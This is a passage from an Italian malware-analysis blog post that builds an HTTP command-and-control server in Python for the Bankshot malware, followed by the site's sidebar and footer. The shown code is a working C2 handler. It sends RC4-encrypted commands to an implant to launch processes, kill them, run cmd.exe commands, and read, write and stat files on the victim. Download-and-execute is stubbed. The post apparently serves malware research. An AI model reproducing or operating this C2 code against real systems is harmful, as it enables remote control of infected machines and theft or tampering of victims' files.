        return x1, x2, x3, x4 | (x5 &lt;&lt; 16)
        

    def sendCommand(): 
        cmdOpt1 = 0
        commandToExecute = input('&#91;C&amp;C - INTERACT] Enter the command to be sent: ')
        
        global lastCommand
            
        print("&#91;C&amp;C - SEND] Send command to execute")       
        cmdCode = struct.pack('&lt;I', int(commandToExecute, 16))
        lastCommand = None
        
        # Comandi senza parametri opzionali
        if commandToExecute == "0x182a" or commandToExecute == "0x182b" or commandToExecute == "0x1831" or commandToExecute == '0x1828' or commandToExecute == '0x1827' or commandToExecute == '0x1835':
            lastCommand = cmdCode
            cmdArg = b''        

        # Eseguire processo by process name
        # Input: process name
        # Output: error code
        if commandToExecute == "0x182e":
            lastCommand = 0x182e
            cmdArg = input('&#91;C&amp;C - INTERACT] Enter process to create (e.g., calc.exe): ').encode()

        # Terminare processo by PID
        # Input: PID processo
        # Output: error code
        if commandToExecute == "0x1832":
            cmdArg = input('&#91;C&amp;C - INTERACT] Enter PID to Kill (e.g., 3163): ').encode()
   
        # Eseguire comando tramite cmd.exe e salva il risultato in temp
        # Input: comando da eseguire nel cmd
        # Output: risultato salvato in file temp
        if commandToExecute == "0x182f":
            lastCommand = 0x182f
            cmdArg = input('&#91;C&amp;C - INTERACT] Enter command to execute (e.g., whoami): ').encode()
            
        # Get file or directory metadata
        # Input: nome file o directory
        # Output: metadati
        if commandToExecute == "0x1830":
            lastCommand = 0x1830
            cmdArg = input('&#91;C&amp;C - INTERACT] Enter file to get stats: ').encode()
                        
        # Read File
        # Input: file to read
        # Output: error code e file content
        if commandToExecute == "0x182d":
            lastCommand = 0x182d
            cmdArg = input('&#91;C&amp;C - INTERACT] Enter file to read: ').encode()
 
        # Write File
        # Input: file da scrivere
        # Output: risultato codice
        if commandToExecute == "0x182c":
            lastCommand = 0x182c
            cmdArg = input('&#91;C&amp;C - INTERACT] Enter file to write: ').encode()
            cmdOpt1 = struct.pack('&lt;I', int(input('&#91;C&amp;C - INTERACT] Enter types of operation (&gt; bytes of file, write): ')))
            pass

        # Set Config
        if commandToExecute == "0x1829":
            # TODO: implementare set config
            pass
            
            
        # Download e eseguire file
        if commandToExecute == "0x183c":
            # TODO: implementare download and execute file
            pass
                
        cmdLen = struct.pack('&lt;H', len(cmdArg)) 
        cmd = cmdCode + cmdLen + cmdArg
        
        if cmdOpt1 != 0:
            cmd = cmd + cmdOpt1
        
        return cmd
        

    def do_POST(self):
    
        bType, bDict = cgi.parse_header(self.headers&#91;'Content-Type']) 
        bDict&#91;'boundary'] = bytes(bDict&#91;'boundary'], 'utf-8')
        fields = cgi.parse_multipart(self.rfile, bDict)

        # Authentication Packet (1 FASE)
        if "user_id" in fields:
            buffer = fields&#91;'board_id']&#91;0].encode()
            print('&#91;C&amp;C - RECEIVE] New Authentication Packet')
            print("&#91;C&amp;C - SEND] Sending authentication response")
            
        # Command Packet (2 FASE)
        elif int(fields&#91;'board_id']&#91;0]) &gt; 10000:
            print('&#91;C&amp;C - RECEIVE] Command Package')
            cmd = self.__class__.sendCommand()
            buffer = self.__class__.rc4Send.encrypt(cmd)
            
        # Risultato Command Packet (3 FASE)
        else:
            print('&#91;C&amp;C - RECEIVE] CMD Execution Result')
            
            cmdResponse = self.__class__.rc4Receive.decrypt(fields&#91;'file1']&#91;0])
            hexdump.hexdump(cmdResponse)
            
            global lastCommand
            
            if(lastCommand == 0x182d):
                if(len(cmdResponse) == 10):
                    result, blank, size = self.__class__.unpack10(cmdResponse)
                    print("&#91;C&amp;C - RECEIVE] File size: " + str(size))
                    cmdCode = struct.pack('&lt;I', 0x0000)
                    buffer = self.__class__.rc4Send.encrypt(cmdCode)
                else:
                    lastCommand = None
                    cmdCode = struct.pack('&lt;IH', 0x1838, 0x00)
                    buffer = self.__class__.rc4Send.encrypt(cmdCode)
                    
            elif(lastCommand == 0x182c):
                if(len(cmdResponse) == 16):
                    lastCommand = None
                    result, blank, size, result2 = self.__class__.unpack16(cmdResponse)
                    print("&#91;C&amp;C - RECEIVE] File size: " + str(size))    
                    
                    toWrite = input('&#91;C&amp;C - INTERACT] Enter data to write: ').encode()

                    lenWrite = struct.pack('&lt;I', len(toWrite))
                    
                    cmdCode = lenWrite + lenWrite + toWrite

                    buffer = self.__class__.rc4Send.encrypt(cmdCode)
          
            else:
                cmd = self.__class__.sendCommand()
                buffer = self.__class__.rc4Send.encrypt(cmd)
 

        self.send_response(200)
        if buffer != None:
            self.setHeader(buffer)
            self.wfile.write(buffer) 
      
            
    def setHeader(self, header = None):
        self.send_header('Amazon', 'text/html')
        self.send_header('Content-type', 'text/html')
        self.send_header('Content-Length', header.__len__())
        self.end_headers()
           
           
def main():

    httpServer = HTTPServer((DOMAIN, PORT), httpHandler)
    print('&#91;C&amp;C - INFO] HTTP SERVER STARTED')
    
    try:
        httpServer.serve_forever()
    except Exception:
        print('&#91;C&amp;C - INFO] Error! Server Closed')


if __name__ == '__main__':
    main()</code></pre>



<p></p>



<p></p>
		<div class="spice_share_wrapper">
		<p class="spice_share_title">Share this content:</p>		<div class="social-icon-box"><ul class="spice_social_share_list  margin ">
								<li class="spice_share_item">
							<button class="spice_social_share_link spice_social_share_link_facebook">
						        <i class="fab fa-facebook-f"></i>
					      </button>	
				  		</li>
												<li class="spice_share_item">
							<button class="spice_social_share_link spice_social_share_link_twitter">
						        <i class="fab fa-twitter"></i>
					        </button>
					        <input type="hidden" id="spice_social_share_tweetuser" value=""/>
				      	</li>
												<li class="spice_share_item">
							<button class="spice_social_share_link spice_social_share_link_linkedin">
						        <i class="fab fa-linkedin-in"></i>
					       </button>
				      	</li>
												<li class="spice_share_item">
							<button class="spice_social_share_link spice_social_share_link_mail">
						        <i class="fa fa-envelope"></i>
					      	</button>
				      	</li>
												<li class="spice_share_item">
							<button class="spice_social_share_link spice_social_share_link_pinterest">
								<input type="hidden" id="spice_social_share_pin_link" value=""/>
						        <i class="fab fa-pinterest"></i>
					      	</button>
					    </li>
								</ul>
	     </div>
		</div>
					</div>	
	</article>   <article class="blog-author media">
      <figure class="avatar">
         <img alt='' src='https://secure.gravatar.com/avatar/b6e052f2089e121c61710ff6573a4a4a?s=250&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/b6e052f2089e121c61710ff6573a4a4a?s=500&#038;d=mm&#038;r=g 2x' class='avatar avatar-250 photo' height='250' width='250' loading='lazy' decoding='async'/>   	</figure>
   	<div class="media-body align-self-center">
         <h5 class="post-by">Scritto da:</h5>
      	<h4 class="name">greenplan</h4>
      	<p class="mb-2">
                     </p>
      	<p><a href="https://malverse.it/author/greenplan" class="text-default ml-1">Visualizza tutti gli articoli <i class="fa fa-long-arrow-right pl-2"></i></a></p>
   	</div>
   </article>
<article class="comment-form">	<div id="respond" class="comment-respond">
		<h3 id="reply-title" class="comment-reply-title">Lascia un commento <small><a rel="nofollow" id="cancel-comment-reply-link" href="/analisi-bankshot-copperhedge#respond" style="display:none;">Annulla risposta</a></small></h3><form action="https://malverse.it/wp-comments-post.php" method="post" id="commentform" class="comment-form" novalidate><p class="comment-notes"><span id="email-notes">Il tuo indirizzo email non sarà pubblicato.</span> <span class="required-field-message">I campi obbligatori sono contrassegnati <span class="required">*</span></span></p><p class="comment-form-author"><label for="author">Nome <span class="required">*</span></label> <input id="author" name="author" type="text" value="" size="30" maxlength="245" autocomplete="name" required /></p>
<p class="comment-form-email"><label for="email">Email <span class="required">*</span></label> <input id="email" name="email" type="email" value="" size="30" maxlength="100" aria-describedby="email-notes" autocomplete="email" required /></p>
<p class="comment-form-url"><label for="url">Sito web</label> <input id="url" name="url" type="url" value="" size="30" maxlength="200" autocomplete="url" /></p>
<p class="comment-form-cookies-consent"><input id="wp-comment-cookies-consent" name="wp-comment-cookies-consent" type="checkbox" value="yes" /> <label for="wp-comment-cookies-consent">Salva il mio nome, email e sito web in questo browser per la prossima volta che commento.</label></p>
<p class="comment-form-comment"><label for="comment">Commento <span class="required">*</span></label> <textarea id="comment" name="comment" cols="45" rows="8" maxlength="65525" required></textarea></p><p class="form-submit"><input name="submit" type="submit" id="submit" class="submit" value="Invia commento" /> <input type='hidden' name='comment_post_ID' value='800' id='comment_post_ID' />
<input type='hidden' name='comment_parent' id='comment_parent' value='0' />
</p></form>	</div><!-- #respond -->
	</article>			</div>	
				<div class="col-lg-4 col-md-5 col-sm-12">
		<div class="sidebar s-l-space">
		<aside id="search-1" class="widget widget_search"><h3 class="widget-title">Search</h3><form class="input-group" method="get" id="searchform" action="https://malverse.it/">
	<input type="search" class="form-control" placeholder="Cerca" value="" name="s" id="s"/>
	<div class="input-group-append">
		<button class="btn btn-success" type="submit">Vai</button>
	</div>
</form></aside>
		<aside id="recent-posts-1" class="widget widget_recent_entries">
		<h3 class="widget-title">Recent Posts</h3>
		<ul>
											<li>
					<a href="https://malverse.it/stack-string-decryptor-con-ghidra-emulator-orchard">Stack String Decrypt con Ghidra Emulator (Orchard)</a>
									</li>
											<li>
					<a href="https://malverse.it/analisi-bankshot-copperhedge" aria-current="page">Realizziamo un HTTP C&#038;C in Python (Bankshot)</a>
									</li>
											<li>
					<a href="https://malverse.it/costruiamo-un-config-extractor-per-danabot-parte-1">Config Extractor per DanaBot (PARTE 1)</a>
									</li>
											<li>
					<a href="https://malverse.it/robinhood-ransomware-bring-your-own-vulnerable-kernel-driver-parte-1">RobinHood Ransomware: Bring Your Own Vulnerable Kernel Driver (PARTE 1)</a>
									</li>
											<li>
					<a href="https://malverse.it/dynamic-analysis-emulare-macro-excel-con-cerbero-suite">[MALDOC] Emulare Macro Excel con Cerbero Suite</a>
									</li>
					</ul>

		</aside><aside id="archives-1" class="widget widget_archive"><h3 class="widget-title">Archives</h3>
			<ul>
					<li><a href='https://malverse.it/2022/10'>Ottobre 2022</a></li>
	<li><a href='https://malverse.it/2022/09'>Settembre 2022</a></li>
	<li><a href='https://malverse.it/2022/08'>Agosto 2022</a></li>
	<li><a href='https://malverse.it/2022/05'>Maggio 2022</a></li>
			</ul>

			</aside>								
		</div>
	</div>
		</div>
	</div>
</section>
        <!-- Call footer function hook  -->
            <footer class="site-footer">
        <div class="container">
                            <div class="seprator-line"></div>
                <div class="row footer-sidebar">
	 <div class="col-lg-4 col-md-4 col-sm-12"><aside id="text-1" class="widget widget_text sml-device widget_text"><h3 class="widget-title">Contattaci</h3>			<div class="textwidget"><p>Per qualunque informazione non esitare a contattarci</p><address>
                            <i class="fa fa-envelope-o"></i><a href="mailto:abc@example.com">admin@malverse.it</a><br>
                         
                        </address></div>
		</aside></div><div class="col-lg-4 col-md-4 col-sm-12">
		<aside id="recent-posts-2" class="widget widget_text sml-device widget_recent_entries">
		<h3 class="widget-title">Recent Posts</h3>
		<ul>
											<li>
					<a href="https://malverse.it/stack-string-decryptor-con-ghidra-emulator-orchard">Stack String Decrypt con Ghidra Emulator (Orchard)</a>
									</li>
											<li>
					<a href="https://malverse.it/analisi-bankshot-copperhedge" aria-current="page">Realizziamo un HTTP C&#038;C in Python (Bankshot)</a>
									</li>
											<li>
					<a href="https://malverse.it/costruiamo-un-config-extractor-per-danabot-parte-1">Config Extractor per DanaBot (PARTE 1)</a>
									</li>
											<li>
					<a href="https://malverse.it/robinhood-ransomware-bring-your-own-vulnerable-kernel-driver-parte-1">RobinHood Ransomware: Bring Your Own Vulnerable Kernel Driver (PARTE 1)</a>
									</li>
											<li>
					<a href="https://malverse.it/dynamic-analysis-emulare-macro-excel-con-cerbero-suite">[MALDOC] Emulare Macro Excel con Cerbero Suite</a>
									</li>
					</ul>

		</aside></div><div class="col-lg-4 col-md-4 col-sm-12"><aside id="categories-2" class="widget widget_text sml-device widget_categories"><h3 class="widget-title">Categories</h3>
			<ul>
					<li class="cat-item cat-item-7"><a href="https://malverse.it/category/malwareanalysis/dynamic-analysis">Dynamic Analysis</a>
</li>
	<li class="cat-item cat-item-8"><a href="https://malverse.it/category/malwareanalysis/maldoc">Maldoc</a>
</li>
	<li class="cat-item cat-item-1"><a href="https://malverse.it/category/malwareanalysis">Malware Analysis</a>
</li>
			</ul>

			</aside></div></div>        </div>
        <div class="site-info text-center">
            <p>Proudly powered by <a href="https://wordpress.org">WordPress </a> | Tema: <a href="https://spicethemes.com" rel="nofollow"> HoneyPress Dark</a> by SpiceThemes</p>
        </div>
    </footer>
            </div>
                    <div class="scroll-up custom right"><a href="#totop"><i class="fa fa-arrow-up"></i></a></div>
        <script type="text/javascript" src="https://malverse.it/wp-content/plugins/spice-social-share/assets/js/socialshare.js?ver=6.7.1" id="spice-social-share-custom-js"></script>
<script type="text/javascript" src="https://malverse.it/wp-content/themes/honeypress/assets/js/bootstrap.min.js?ver=6.7.1" id="bootstrap-js"></script>
<script type="text/javascript" src="https://malverse.it/wp-content/themes/honeypress/assets/js/smartmenus/jquery.smartmenus.js?ver=6.7.1" id="jquery-menu-js"></script>
<script type="text/javascript" src="https://malverse.it/wp-content/themes/honeypress/assets/js/smartmenus/jquery.smartmenus.bootstrap-4.js?ver=6.7.1" id="jquery-menu-bootstrap-js"></script>
<script type="text/javascript" src="https://malverse.it/wp-content/themes/honeypress/assets/js/owl.carousel.min.js?ver=6.7.1" id="owl-js"></script>
<script type="text/javascript" src="https://malverse.it/wp-content/themes/honeypress/assets/js/custom.js?ver=6.7.1" id="honeypress-custom-js-js"></script>
<script type="text/javascript" src="https://malverse.it/wp-includes/js/comment-reply.min.js?ver=6.7.1" id="comment-reply-js" async="async" data-wp-strategy="async"></script>
	<script>
	/(trident|msie)/i.test(navigator.userAgent)&&document.getElementById&&window.addEventListener&&window.addEventListener("hashchange",function(){var t,e=location.hash.substring(1);/^[A-z0-9_-]+$/.test(e)&&(t=document.getElementById(e))&&(/^(?:a|select|input|button|textarea)$/i.test(t.tagName)||(t.tabIndex=-1),t.focus())},!1);
	</script>
	    </body>
</html>
